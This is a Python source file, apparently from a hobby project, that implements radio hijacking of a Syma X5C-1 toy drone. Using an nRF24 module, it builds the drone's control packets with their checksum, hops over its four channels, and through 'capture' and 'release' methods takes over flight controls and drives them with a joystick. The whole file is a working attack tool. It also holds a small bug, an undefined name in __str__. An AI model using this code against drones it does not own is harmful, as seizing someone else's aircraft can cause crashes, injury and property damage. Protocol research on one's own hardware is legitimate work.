#
# Syma X5C-1 drone hacking
#

from threading import Thread
from RF24 import *
import time

from .joystick import JoystickController
from .radio import RadioManager
from . import disp



# ==========================
#    SymaController class
# ==========================

class SymaController(Thread):

    def __init__(self, radio, address, channels):
        disp.debug("Initializing radio")

        self.address = address
        self.channels = channels
        self.radio = radio

        self.ch = 0
        self.running = False

        self.aileron = 0
        self.elevator = 0
        self.throttle = 0
        self.rudder = 0

        self.packet = [0] * 10

        self.joystick_controller = JoystickController(self)
        self.joystick_controller.start()

        super(SymaController, self).__init__()


    def __str__(self):
        return disp.str_join("Syma X5C-1", self.address,
                "on channels", '[%s]' % ', '.join(map(str, drone)) )


    def __eq__(self, other):
        return isinstance(other, self.__class__)            \
                and self.address.__eq__(other.address)      \
                and self.channels.__eq__(other.channels)



    # =======================
    #    Packet management
    # =======================

    def checksum(self, data):
        csum = data[0]
        for i in range(1, len(data)-1, 1):
            csum = (csum ^ data[i])
        return (csum + 0x55) % 256


    def build_packet(self):
        self.packet[0] = self.throttle
        self.packet[1] = self.elevator
        self.packet[2] = self.rudder
        self.packet[3] = self.aileron
        self.packet[4] = 0x40
        self.packet[5] = 0x00#(elevator >> 2) | 0xc0;  // always high rates (bit 7 is rate control)
        self.packet[6] = 0x00#(rudder >> 2)   | (flags & FLAG_FLIP  ? 0x40 : 0x00);
        self.packet[7] = 0x00#aileron >> 2
        self.packet[8] = 0x00
        self.packet[9] = self.checksum(self.packet)

        #disp.debug('Sent Payload: ',
        #        '0x{:02x}'.format(self.packet[0]),
        #        format(self.packet[1],'02x'),
        #        format(self.packet[2],'02x'),
        #        format(self.packet[3],'02x'),
        #        format(self.packet[4],'02x'),
        #        format(self.packet[5],'02x'),
        #        format(self.packet[6],'02x'),
        #        format(self.packet[7],'02x'),
        #        format(self.packet[8],'02x'))


    def set_controls(self, aileron, elevator, throttle, rudder):
        self.aileron  = aileron
        self.elevator = elevator
        self.throttle = throttle
        self.rudder   = rudder


    # =====================
    #    Threading stuff
    # =====================

    def exit(self):
        self.release()
        self.joystick_controller.stop()
        self.stopped = True

    def run(self):
        self.stopped = False
        self.radio.set_tx(int(self.address, 16))
        while not self.stopped:
            if self.running:
                self.build_packet()

                self.ch += 1
                self.ch = self.ch % 4
                self.radio.nrf.setChannel(self.channels[self.ch])

                #disp.debug("channel =", str(self.channels[self.ch]),
                #        "- address =", str(self.address),
                #        "- payload =", str(self.packet))
                self.radio.nrf.write(bytearray(self.packet))
                time.sleep(0.000001)
            else:
                time.sleep(0.5)


    # ===================
    #    Hacking stuff
    # ===================

    def capture(self):
        disp.debug("Capturing drone", str(self.address), "on channels",
                '[%s]' % ', '.join(map(str, self.channels)))
        disp.info("Press <START> to release.")
        self.running = True


    def release(self):
        if self.running:
            disp.info("Releasing drone", str(self.address), "on channels",
                    '[%s]' % ', '.join(map(str, self.channels)))
            self.running = False

